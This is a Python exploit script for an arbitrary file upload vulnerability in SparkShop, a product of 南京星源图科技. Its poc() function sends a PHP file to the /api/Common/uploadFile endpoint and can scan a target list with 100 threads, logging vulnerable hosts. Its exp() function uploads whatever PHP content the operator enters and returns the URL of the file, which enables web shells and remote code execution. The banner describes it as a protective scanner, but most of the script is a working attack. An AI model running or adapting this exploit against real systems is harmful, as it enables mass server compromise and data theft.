import argparse, requests, sys, time,json
from multiprocessing.dummy import Pool

requests.packages.urllib3.disable_warnings()


def banner():
    test = """
┌──────────────────────────────────────────────────────────────────────────────┐
│                                                                              │
│                         ┌─────────────────────────────────────┐              │
│                         │               ( •_•)                │              │
│                         │              / ︻╦╤─                               
│                         │             | 南京星源图科技漏洞安全漏洞扫描工具                
│                         │              \─╤╦═                  │              │
│                         └─────────────────────────────────────┘              │
│                                                                              │
│                  * 🚀🛡️🔐🔍 - 扫描系统的潜在漏洞，保持系统安全！author:QXQ         │
│                  * 🛠️📈🔍 - 定期使用，修复问题，减少风险！     date:2024-09-3    
│                  * 🕵️‍♂️💻🔧 - 保障系统稳定，防止攻击！          version:1.0.0 
│                                                                              │
└──────────────────────────────────────────────────────────────────────────────┘

"""
    print(test)


def main():
    banner()
    parser = argparse.ArgumentParser(description="南京星源图科技_SparkShop_任意文件上传漏洞")
    parser.add_argument('-u', '--url', dest='url', type=str, help="input your url")
    parser.add_argument('-f', '--file', dest='file', type=str, help='input file path')
    args = parser.parse_args()
    if args.url and not args.file:
        if poc(args.url):
            exp(args.url)
    elif not args.url and args.file:
        url_list = []
        with open(args.file, 'r', encoding='utf-8') as fp:
            for i in fp.readlines():
                url_list.append(i.strip().replace('\n', ''))
        mp = Pool(100)
        mp.map(poc, url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usag:\n\t python3 {sys.argv[0]} -h")


def poc(target):
    payload = '/api/Common/uploadFile'
    url = target + payload
    headers = {
        "User-Agent":"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36",
        "Content-Type":"multipart/form-data;boundary=----WebKitFormBoundaryj7OlOPiiukkdktZR"
    }
    data = '------WebKitFormBoundaryj7OlOPiiukkdktZR\r\nContent-Disposition: form-data; name="file";filename="1.php"\r\n\r\n<?php echo "hello world";?>\r\n------WebKitFormBoundaryj7OlOPiiukkdktZR--'
    proxies = {
        'http': 'http://127.0.0.1:8080',
        'https': 'http://127.0.0.1:8080'
    }

    try:
        response = requests.post(url=url, headers=headers, data=data, timeout=5)
        if response.status_code == 200 and "upload success" in response.text:
            print(f"[+] {target} 存在文件上传漏洞！\n")
            with open('result.txt', 'a', encoding='utf-8') as f:
                f.write(target + '\n')
                return True
        else:
            print("[-]{target}不存在漏洞！！")
            return False
    except requests.exceptions.ConnectionError as e:
        print(f"该url存在问题{target}: {str(e)}")
    except requests.exceptions.RequestException as e:
        print(f"{target} 请求错误: {str(e)}")
    except Exception as e:
        print(e)
        return False

def exp(target):
    try:
        put = input("请输入要上传的文件内容：")
        data = (
            "------WebKitFormBoundaryj7OlOPiiukkdktZR\r\nContent-Disposition: form-data; name=\"file\"; filename=\"qiuyv.php\"\r\nContent-Type: application/x-php\r\n\r\n" + put + "\r\n------WebKitFormBoundaryj7OlOPiiukkdktZR--"
        )

        headers = {
            "Content-Type": "multipart/form-data; boundary=----WebKitFormBoundaryj7OlOPiiukkdktZR",
            "Content-Length": str(len(data))
        }
        payload = "/api/Common/uploadFile"

        res = requests.post(target + payload, headers=headers, data=data, verify=False)
        if res.status_code == 200:
            try:
                res_json = res.json()
                if res_json.get('msg') == "upload success":
                    data = res_json['data']
                    url = data['url']
                    print(f"上传成功！PHP文件地址：{url}")
                else:
                    print("文件上传失败")
            except json.JSONDecodeError:
                print("返回内容不是有效的 JSON")
        else:
            print(f"文件上传请求失败，状态码: {res.status_code}")
    except Exception as e:
        print(f"请求出错: {e}")



























if __name__ == '__main__':
    main()